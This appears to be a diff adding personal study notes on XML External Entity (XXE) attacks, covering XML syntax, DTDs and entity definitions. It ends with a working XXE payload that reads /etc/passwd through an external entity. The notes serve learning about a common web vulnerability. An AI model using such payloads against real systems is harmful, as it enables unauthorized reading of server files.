@@ -1,0 +1,84 @@
+-XML External Entitiy (XXE) attack is a vulnerability that abuses features of XML parsers/data
+-allows an attacker to interact with any backend or external system that the application itself can access
+-can allow attacker to access files on that system
+-can cause DoS(Denial of Service) attack
+-can perform Server-side Request Forgery (SSRF)
+-can enable Port scanning
+-can lead to RCE
+
+Two types:
+1. In-band XXE attack: attacker can receive an immediate response to the XXE payload
+2. Out-of-band XXE attack: attacker has to reflect the output of their XXE payload to some other file or their own server
+
+---------------------------------------------------------------------------------------------------------
+
+XML: eXtensible Markup Language - markup language that defines a set of rules for encoding documents in a formal that is both human and machine readable
+-markup language for storing and transporting data
+-platform independent
+-programming language independent (can be used by any system)
+-data stored and transported can change at any ponit without affecting the data presentation
+-allows validation using DTD and Schema, ensures that XML document is free from any syntax error
+-simplified data sharing b/n various systems
+
+syntax:
+<?xml version="1.0" encoding="UTF-8"?> - xml prolog verision and encoding
+<mail>
+   <to>falcon</to>
+   <from>feast</from>
+   <subject>About XXE</subject>
+   <text>Teach about XXE</text>
+</mail>
+
+<mail> - ROOT element to <to>, <from>, <subject>, <text>
+Root element - required
+close element </mail>
+-case sensitive
+
+---------------------------------------------------------------------------------------------------------
+
+DTD: Document Type Definition
+-defines the structure and the legal elements and attributes of an XML doc
+-.dtd file
+-define a new element: !ELEMENT
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note SYSTEM "note.dtd"> ***DTD***
+<note>
+    <to>falcon</to>
+    <from>feast</from>
+    <heading>hacking</heading>
+    <body>XXE attack</body>
+</note>
+-example:
+<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
+-!DOCTYPE: defines a root element
+-!ELEMENT note: defines the note element must contain elements: 'to', 'from', 'heading', 'body'
+-!ELEMENT to: defines 'to' element to be type "#PCDATA"
+-!ELEMENT from: defines 'from' element to be of type "#PCDATA"
+-!ELEMENT heading: defines 'heading' element to be of type "#PCDATA"
+-!ELEMENT body: defines 'body' element to be of type "#PCDATA"
+#PCDATA: parsable character data
+
+new ENTITY: !ENTITY
+
+-----------------------------------------------------------------------------------------------------------
+
+XXE PAYLOAD
+-replace entity: eg
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+
+-read file from the system by defining an entit: eg
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+
+-new ENTITY defined
+
+--------------------------------------------------------------------------------------------------------------
+
+
+
+
